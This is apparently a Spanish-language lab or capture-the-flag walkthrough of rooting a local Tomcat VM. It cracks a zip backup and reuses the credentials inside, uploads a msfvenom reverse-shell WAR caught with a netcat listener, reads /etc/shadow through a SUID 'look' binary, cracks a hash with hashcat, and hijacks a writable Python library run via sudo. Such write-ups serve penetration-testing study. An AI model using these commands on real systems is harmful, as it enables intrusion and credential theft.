

# PortScan

```
# Nmap 7.93 scan initiated Tue Nov 14 10:11:41 2023 as: nmap -sCV -p22,80,8080 192.168.204.161 
Failed to resolve "22,80,8080".
Failed to resolve "22,80,8080".
Nmap scan report for 192.168.204.161
Host is up (0.00083s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6ad8446080397ef02d082fe58363f070 (RSA)
|   256 f2a662d7e76a94be7b6ba512692efed7 (ECDSA)
|_  256 28e10d048019be44a64873aae86a6544 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.53
MAC Address: 00:0C:29:52:93:A1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Failed to resolve "22,80,8080".
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 14 10:11:48 2023 -- 1 IP address (1 host up) scanned in 7.06 seconds
```

# WebScan

```
# Nmap 7.93 scan initiated Tue Nov 14 10:17:04 2023 as: nmap --script http-enum -p8080,80 -oN webS
Nmap scan report for 192.168.204.161
Host is up (0.00040s latency).

PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
| http-enum: 
|   /backup.zip: Possible backup
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
MAC Address: 00:0C:29:52:93:A1 (VMware)

# Nmap done at Tue Nov 14 10:17:08 2023 -- 1 IP address (1 host up) scanned in 4.43 seconds
```

Vemos qué nos reporta un recurso "**backup.zip**" en el servicio web **http** del puerto **:8080**, procedemos a descargárnoslo en local para descomprimirlo.
![[Pasted image 20231114120913.png]]
Al intentar descomprimirlo descubrimos qué está encriptado con contraseñas, pero con la herramienta "**fcrackzip**" podríamos intentar crackear el .**ZIP**

![[Pasted image 20231114121332.png]]

1. **"-u":** usamos este parámetro para eliminar contraseñas qué no coincidan.
2. **"-b"**: usamos este parámetro para indicar qué queremos aplicar fuerza bruta.
3. "**-D, -p**" usamos este parámetro para indicar el diccionario el cual queremos aplicar en el ataque de BF.
y al final indicamos el **.ZIP** al que queremos hacerle el ataque.

Una vez descomprimamos tendríamos varios archivos, uno de ellos se llama "**tomcat-users.xml**" por lo qué sospechoso qué probablemente aquí encontremos credenciales en formato XML.

![[Pasted image 20231114121824.png]]

Obteniendo así las credenciales de **Admin**, para el servicio web del **:8080**, así que entro a ver este servicio.

![[Pasted image 20231114122049.png]]

Encontrándome con un servicio apache **Tomcat**, como nos lo suponíamos al descomprimir el backup, le damos a **"Manager App**", nos pedirá credenciales, qué ya conocemos la admin, así que la ponemos para encontrarnos con el panel.

Descubriendo así, que podemos subir archivos .WAR.
![[Pasted image 20231114122240.png]]

Por lo que se me ocurre buscar posibles vulnerabilidades para conectarnos a la máquina qué está corriendo el servicio, encontrándome en [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat) qué podemos mediante "**MSFVenom**" crearnos un payload para entablarnos una Reverse Shell con éste one liner:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```

así qué procedemos a poner nuestra IP, y el puerto donde estaremos en escucha,  para tener el "**revshell.war**".

Nos ponemos en escucha en nuestra máquina.
```bash
nc -nlvp 443
```

Procedemos a subir el "**revshell.war**", una vez subido nos aparecerá en el panel.

![[Pasted image 20231114122915.png]]

Le damos click encima de lo que está marcado en rojo, y ya debería entablarnos conexión con nuestro puerto en escucha.

![[Pasted image 20231114123128.png]]

Ahora sólo quedaría darle **tratamiento a la TTY**, que si no sabemos cómo te recomiendo [((CLICKEAR AQUÍ))](https://4uli.github.io/tratamiento-tty/)

# Escala de Privilegios #1 

Estamos como el usuario "**tomcat**" que es el servicio web, por lo qué nos interesa escalar nuestro privilegio.

![[Pasted image 20231114123841.png]]

Vemos qué tienen directorios "**jaye**" y "**randy**", por lo qué intento acceder a estos usuarios usando las credenciales qué usamos para acceder como admin a Tomcat.

![[Pasted image 20231114123946.png]]

Logrando así entrar como "**jaye**"

# Escalada de Privilegios #2

Y sí como "**jaye**" buscamos ejecutables o binarios con permisos SUID.
```bash
find / -perm -4000 2>/dev/null
```

![[Pasted image 20231114124148.png]]

Encontraríamos este ejecutable que podemos usar como como Root gracias a su SUID, así qué intento ver como funciona este programa.
![[Pasted image 20231114124257.png]]

Me fijo más en la parte que podemos usar un **strings** & luego una ruta, pruebo para ver de que se trata...

![[Pasted image 20231114124352.png]]

Viendo qué aparentemente busca únicamente por el string qué le pongamos en una ruta de un archivo dado, por lo que se me ocurre listar el "**/etc/shadow**" tal que así:
```bash
./look "" /etc/shadow
```

para qué nos liste por todo el contenido de  "**/etc/shadow**" viendo así las contraseñas hasheadas de los usuarios a nivel de sistema.
![[Pasted image 20231114124719.png]]

Tenemos el hash del usuario "**randy**", por lo qué podríamos mediante un ataque de fuerza bruta con "**hashcat**" tratar de crackear la contraseña con un diccionario dado.

Nota; esto lo haré en mi máquina local windows ya qué suele ir más rápido el ataque de fuerza bruta.

Ya con **hashcat** instalado en nuestra máquina local windows, en el mismo directorio del **hashcat.exe** metemos un "**hash.txt**" qué contenga todo el hash qué vimos de Randy en el "**/etc/shadow**", para posteriormente dentro del mismo directorio tener el diccionario "**rockyou.txt**", una vez todo esto configurado, procedemos a abrirnos una **PowerShell** en esa ruta para poner la siguiente linea.
```python
.\hashcat.exe -m 1800 -a 0 hash.txt rockyou.txt
```

Esto demorará bastante, pero una vez finalicé debería reportarnos la credencial válida para el usuario "**randy**"
![[password.png]]

# Escalada de Privilegios #3 

Una vez como "**randy**" si vemos los permisos SUDOERS.

```bash
sudo -l
```

![[Pasted image 20231114125343.png]]

Vemos qué podemos ejecutar el "**randombase64.py**" como el usuario Root, pero el script de primera no hace nada malicioso o qué comprometa a Root, sin embargo, si analizamos el script.

![[Pasted image 20231114125435.png]]

Importa la librería **base64**, por lo qué podríamos ver sí tenemos permisos para modificar esta librería & volverla maliciosa.

Hacemos una búsqueda de la librería descubriendo su ruta absoluta:
```bash
find / -name base64.py 2>/dev/null
```

![[Pasted image 20231114125550.png]]

![[Pasted image 20231114125658.png]]

Tenemos permisos para escribir, así qué podemos aprovecharnos de modificar la librería para que sea maliciosa.

![[Pasted image 20231114130230.png]]

Importamos la librería **OS** para qué la bash tenga permisos **SUID** y como es **Root** qué ejecuta el script "**randombase64.py**" tendrá permisos para hacerlo.

Ejecutamos nuevamente el "**randombase64.py**" pero con los permisos **SUDOERS**.
```python
sudo /usr/bin/python3.8 /home/randy/randombase64.py
```


![[Pasted image 20231114130328.png]]

Y nos convertiriamos en Root.